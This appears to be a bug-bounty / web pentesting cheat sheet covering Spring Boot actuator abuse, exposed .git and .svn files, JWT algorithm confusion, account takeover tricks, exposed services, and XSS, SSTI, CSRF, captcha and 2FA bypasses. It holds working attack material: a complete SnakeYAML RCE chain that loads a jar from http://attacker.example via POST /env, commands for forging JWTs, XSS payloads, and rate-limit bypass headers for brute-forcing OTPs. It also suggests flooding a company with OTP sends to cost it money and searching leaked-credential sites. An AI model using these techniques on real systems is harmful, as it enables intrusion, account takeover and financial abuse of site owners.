- Actuator endpoints let you monitor and interact with your application. Spring Boot includes a number of built-in endpoints and lets you add your own. For example, the /health endpoint provides basic application health information. Some of them contains sensitive info such as :
    /trace - Displays trace information (by default the last 100 HTTP requests with headers).
    /env - Displays the current environment properties (from Spring’s ConfigurableEnvironment).
    /heapdump - Builds and returns a heap dump from the JVM used by our application.
    /dump - Displays a dump of threads (including a stack trace).
    /logfile - Outputs the contents of the log file.
    /mappings - Shows all of the MVC controller mappings.

	These endpoints are enabled by default in Springboot 1.X. Note: Sensitive endpoints will require a username/password when they are accessed over HTTP.

	Since Springboot 2.X only /health and /info are enabled by default.
- Spring is able to load external configurations in the YAML format. The YAML config is parsed with the SnakeYAML library, which is susceptible to deserialization attacks. In other words, an attacker can gain remote code execution by loading a malicious config file.
    Generate a payload of SnakeYAML deserialization gadget.
    Build malicious jar
	git clone https://github.com/artsploit/yaml-payload.git
	cd yaml-payload
	# Edit the payload before executing the last commands (see below)
		javac src/artsploit/AwesomeScriptEngineFactory.java
		jar -cvf yaml-payload.jar -C src/ .
    Edit src/artsploit/AwesomeScriptEngineFactory.java
			public AwesomeScriptEngineFactory() {
			    try {
			        Runtime.getRuntime().exec("ping rce.poc.attacker.example"); // COMMAND HERE
			    } catch (IOException e) {
			        e.printStackTrace();
			    }
			}

			    Create a malicious yaml config (yaml-payload.yml)

			!!javax.script.ScriptEngineManager [
			  !!java.net.URLClassLoader [[
			    !!java.net.URL ["http://attacker.example/yaml-payload.jar"]
			  ]]
			]
    Host the malicious files on your server.
    	yaml-payload.jar
    	yaml-payload.yml
    Change spring.cloud.bootstrap.location to your server.

		POST /env HTTP/1.1
		Host: victim.example:8090
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 59
 
		spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml
    Reload the configuration.

		POST /refresh HTTP/1.1
		Host: victim.example:8090
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 0
- Git saves all information in .git/logs/HEAD (try lowercase head too) 
- Access the commit using the hash 
	# create an empty .git repository
		git init test
		cd test/.git
	# download the file
		wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
	# first byte for subdirectory, remaining bytes for filename
		mkdir .git/object/26
		mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
	# display the file
		git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
- curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
- jSON Web Token : Base64(Header).Base64(Data).Base64(Signature)
- Default algorithm is "HS256" (HMAC SHA256 symmetric encryption). "RS256" is used for asymmetric purposes (RSA asymmetric encryption and private key signature).
- Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.(The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.)
- Here are the steps to edit an RS256 JWT token into an HS256.
    Convert our public key (key.pem) into HEX with this command.
    	cat key.pem | xxd -p | tr -d "\\n"
    	2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
    Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.
    	echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
    	(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
    Convert signature (Hex to "base64 URL")
    	python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
    Add signature to edited payload
- Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: "admin "
- Account takeover due to unicode normalization issue,Victim account: demo@gmail.com,Attacker account: demⓞ@gmail.com
- Kubernetes API: unauthenticated REST API on port 10250
- Unauthenticated Elasticsearch DB: port "9200" 
- Docker has some servies that can be exposed that may be an easy win. Mainly when you install docker on system it will pose an API on your localhost on Port 2375. As its on localhost by default you cant interact however in certain instances this is changed and it is available.
- Kubernetes exposes an unauthenticated REST API on port 10250. Once a Kubernetes service is detected the first thing to do is to get a list of pods by sending a GET request to the /pods endpoint.
- Unauthenticated odoo Manager: http.status:200 http.component:odoo port:8069, After finding instances go to /web/database/manager most of the time there is either no password or it's "admin" Or simply port scan for 8069
- Sometimes an application will be running Jenkins which allows Guest/Anonymous signups with /script enabled which allows code exec.
- if you are working on a big program with thousands of domains to grep for jenkins and pipe all subdomains into full tcp ports scans. Sometimes the instance can be running on a weird port
- use sstimap and tplmap tools to detect ssti 
- n most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability : ${{<%[%'"}}%\.
- Modify cookie.session token value by 1 bit/byte. Then resubmit and do the same for all token. Reduce the amount of work you need to perform in order to identify which part of token is actually being used and which is not.
- Check for session cookies and cookie expiration date/time
- Check for duplicate registration / Overwrite existing user
- Is it possible to use resources without authentication? Access violation
- Check if user credentials are transmitted over SSL or not.
- Bypass rate limiting by tampering user agent to Mobile User agent.
- Bypass rate limiting by tampering user agent to Anonymous user agent.
- Error Codes Testing•Generate custom pages such as /chintan.php, chintan.aspx and identify error page
- Add multiple parameters in same post get request using different value and generate error
- Add [], ]], and [[ in cookie values and parameter values to create errors
- Try to generate unusual error code by giving input as /~chintan/%s at the end of website URL
- Open profile picture in new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Image
- Check account deletion option if application provides it and confirm that via forgot password feature
- Failure to invalidate session on Logout and Password reset•Check if forget password reset link/code uniqueness
- Check if reset link does get expire or not if its not used by the user for certain amount of time
- Find user account identification parameter and tamper Id or parameter value to change other user's password•Check for weak password policy
- Weak password reset implementation -Token is not invalidated after use
- If reset link have another params such as date and time, then. Change date and time value in order to make active & valid reset link.
- Check if security questions are asked? How many guesses allowed? -> Lockout policy maintained or not?
- Add only spaces in new password and confirmed password. Then Hit enter and see the result.
- Does it display old password on the same page after completion of forget password formality?
- Ask for two password reset link and use the older one from user's email
- Check if active session gets destroyed upon changing the password or not?
- Weak password reset implementation -Password reset token sent over HTTP
- setting a user's name to an XSS payload
- Clicking on external links within the reset password page leaked password reset token in the referer header.
- Send continuous forget password requests so that it may send sequential tokens
- Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks?
- Does it allow to upload file on the server?
- Upload file using '"><img src=x onerror=alert(document.domain)>.txt
- If script tags are banned, use <h1> and other HTML tags
- f output is reflected backinside the JavaScript as a value of any variable just use alert(1)
- if " are filtered then use this payload /><img src=d onerror=confirm(/chintan/);>
- Syntax Encoding payload “%3cscript%3ealert(document.cookie)%3c/script%3e"
- If the logout button just performs the redirection then use old classic XSS payload
- Locator (Error Based): Test'"" 123' ""Þ}j%Ùÿ'""'""""';'  '""();=,%+-/**/ --«
- Give below URL in web browser and check if application redirects to the www.chintan.com website or not.ohttps://www.target.com/ÿ/www.twitter.com/ohttps://www.target.com//www.twitter.com/ohttps://www.target.com/Ã¿/www.twitter.com/ohttps://www.target.com//www.twitter.com/•Bypass filter using returnTo=///chintan.com/•Bypass filter using returnTo=http:///chintan.com/
- Check if ASP.net viewstate parameter is encrypted or not
- Check if any ASP configuration is disclosed publicly or not
- Check if error codes reveal the version of ASP.NET used in the application
- Re-use Anti-CSRF token for CSRF attack
- Check if token is validated on server side or not
- Check if token validation for full length or partial length
- Create few dummy account and compare the CSRF token for all those accounts
- Bypass CSRF token using 2 input type fields in for updating user's information in the same HTML file
- Convert POST request to GET and remove _csrf (anti-csrf token) to bypass the CSRF protection.
- Check if the value you are trying to change is passed in multiple parameters such as cookie, http headers along with GET and POST request.
- Send old captcha value with if accepts then it is vulnerable.
- Send old captcha value with old session ID, if itsaccepts then it is vulnerable.
- Check if captcha is retrievable with the absolute path such aswww.chintan.com/internal/captcha/images/24.png
- Check for the server-side validation for CAPTCHA. Remove captcha block from GUI using firebug addon and submit request to the server.
- Check if image recognition can be done with OCR tool?oIf OCR identifies then report as weak strength of captcha OCR (Optical Character Recognition)
- Check for SSRF Vulnerability by giving www.chintan.com:22 , www.chintan.com:23 etc. Check for the response page and determine if port 22 is opened in chintan website. If yes then target website is vulnerable to SSRF vulnerability.
- Check for security headers and at least:
	X-Frame-Options
	X-XSS header
	HSTS header
	CSP header
	Referrer-Policy
	Cache Control
	Public key pins
- Command injection on CSV export (Upload/Download)
- DDOS using xmlrpc.php
- If website has a feature for importing contacts from .CSV filesthen Add one contact in your CSV file with the name "><script>alert("chintan")</script>..Import contact to the website and Check if script getting executed or not.
- f CSP header blocks the clickjacking attack and origin parameter is present in the original requestthen this scenario can be bypassed by adding Unicode characters in the value of origin header
- Use PATCH HTTP header to find information disclosure
- Bypass rate limiting by using null byte
- WordPress Common Vulnerabilities:
	XSPA in wordpress
	Bruteforce in wp-login.php
	Information disclosure wordpress username
	Backup file wp-config exposed
	Log files exposed
	Denial of Service via load-styles.php
	Denial of Service via load-scripts.php
	DDOS using xmlrpc.php
- With the domains, subdomains, and emails you can start looking for credentials leaked in the past belonging to those emails: https://leak-lookup.com/account/login
https://www.dehashed.com/

- 2FA - Forced browsing: Try accessing different endpoints directly with the avilable token
- 2FA - Response Manipulation: change : {succes:"false"} -> {success:"true"}
- 2FA - Response manipulation status code: change 403 -> 200
- 2FA - Reusable Codes: using the same code twice for bypassing validation
- 2FA - Lack of bruteforce: Bruteforce the pin 
- 2FA - lack of bruteforce with Additional Headers:
		try to Bypass ratelimit using these headers:
		1.  X-Originating-IP: 127.0.0.1
		2.  X-Forwarded-For: 127.0.0.1
		3.  X-Remote-IP: 127.0.0.1
		4.  X-Remote-Addr: 127.0.0.1
		5.  X-Forwarded-Host : 127.0.0.1
		6.  X-Client-IP : 127.0.0.1
		7.  X-Host : 127.0.0.1
		8.  Forwarded: 127.0.0.1
		9.  X-Forwarded-By: 127.0.0.1
		10.  X-Forwarded-For-IP: 127.0.0.1
		11.  X-True-IP: 127.0.0.1
- 2FA - Cross token usage: Use the token A on Account B
- 2FA - Bypass using 0Auth: Try loggin in using 0Auth this may bypass 2fa
- 2FA - No limit to send OTP by company: Send as many as request to the company to waste as much money as can
- 2FA - Bruteforce - IP based bruteforce: Try bypassing the rate limit protection using BURPIPROtator Plugin
- 2FA - Previous OTP not expiring:
		1.  Get a OTP 12345
		2.  GET a new OTP 877678
		3.  Try using the 12345
		4.  if its working you can try getting as many as OTP's to increase the chances of bruteforcing

- 2FA - Password Change: After changing the password the webapp may not ask for 2FA confirmation.

---update 2023
